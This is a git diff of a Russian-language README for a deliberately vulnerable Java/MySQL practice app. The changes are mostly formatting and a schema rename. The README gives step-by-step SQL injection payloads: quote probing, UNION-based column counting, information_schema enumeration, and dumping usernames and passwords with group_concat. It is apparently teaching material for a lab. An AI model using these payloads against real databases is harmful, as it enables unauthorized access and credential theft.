@@ -6,7 +6,9 @@
 Для запуска данного проекта потребуется:
 
 1) Любая среда разработки под Java (JDK и JRE, версия java 7 и старше)
+
 2) БД MySQL (использовавлась версия 5.6)
+
 3) Любой apllication server (Для запуска использовался контейнер сервлетов Tomcat версии 8.0.18)
 
 Подготовительный этап:
@@ -29,26 +31,36 @@ container). После открытия главной страницы прил
 
   SQL инъекции:
   
-	1)  Проверим наличие уязвимости к SQL инъекциям. (Ввести символ ' в поле Username, чтобы увидеть сообщение об ошибке);
-	2)  Написать вилидный SQL запрос (чтобы не было сообщения об SQL ошибке, например a' or '1' = ' )
+	1)  Проверим наличие уязвимости к SQL инъекциям.
+	(Ввести символ ' в поле Username, чтобы увидеть сообщение об ошибке);
+	
+	2)  Написать вилидный SQL запрос 
+	(чтобы не было сообщения об SQL ошибке, например a' or '1' = ' )
+	
 	3)  Подбираем количество столбцов с помощью чисел: 
 	
     	a' union select 1 from information_schema.TABLES where '1' = '1' or '1' = '
     	a' union select 1,2 from information_schema.TABLES where '1' = '1' or '1' = '
     	a' union select 1,2,3 from information_schema.TABLES where '1' = '1' or '1' = '
     	
-  4)  Попробовать узнать прочую информацию:
+  	4)  Попробовать узнать прочую информацию:
     	
     	a' union select 1,version(),3 from users where '1' = '1' or '1' = '
     	a' union select 1,user(),3 from users where '1' = '1' or '1' = '
     	a' union select 1,database(),3 from users where '1' = '1' or '1' = '
 	
 	5)  Зная название базы узнаем названием таблиц в ней:
-	    a' union SELECT 1,TABLE_NAME,3 from information_schema.TABLES WHERE TABLE_SCHEMA = 'md5practise' or '1' = '
-  6)  Теперь надо узнать имена столбцов:
-	    a' union SELECT 1,group_concat(COLUMN_NAME),3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'md5practise' AND TABLE_NAME = 'users' or '1' = '
+
+	    a' union SELECT 1,TABLE_NAME,3 from information_schema.TABLES WHERE TABLE_SCHEMA = 'sql_injection_practise' or '1' = '
+  
+  	6)  Теперь надо узнать имена столбцов:
+	
+	    a' union SELECT 1,group_concat(COLUMN_NAME),3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'sql_injection_practise' AND TABLE_NAME = 'users' or '1' = '
+	
 	7)  Пытаемся получить содержимое таблицы users: 
-	    a' union select 1,2,3 from users where '1' = '1' or '1' = '
+	
+	a' union select 1,2,3 from users where '1' = '1' or '1' = '
+	
 	8) Теперь можно достать информацию из базы о пользователе: 
     	
     	a' union select 1,nick,3 from users where '1' = '1' or '1' = '
@@ -59,12 +71,13 @@ container). После открытия главной страницы прил
 	
 	    Можно экспериментировать с условиями:
     	
-    	a' union select 1,username,3 from users where id_user = 1 or '1' = '
-    	a' union select 1,username,3 from users where id_user = 1 or true -- 
-    	a' union select 1,username,3 from users where id_user = 1 or true --  
-      
+	    	a' union select 1,username,3 from users where id_user = 1 or '1' = '
+	    	a' union select 1,username,3 from users where id_user = 1 or true -- 
+	    	a' union select 1,username,3 from users where id_user = 1 or true --  
+	      
       Объединить несколько полей в одном:
-	    a' union select 1,group_concat(concat(username, 0x3a, password)),3 from users where '1' = '1' or '1' = '
+	    	
+	    	a' union select 1,group_concat(concat(username, 0x3a, password)),3 from users where '1' = '1' or '1' = '
 	
   Определение пароля по значению хеш функции:
   
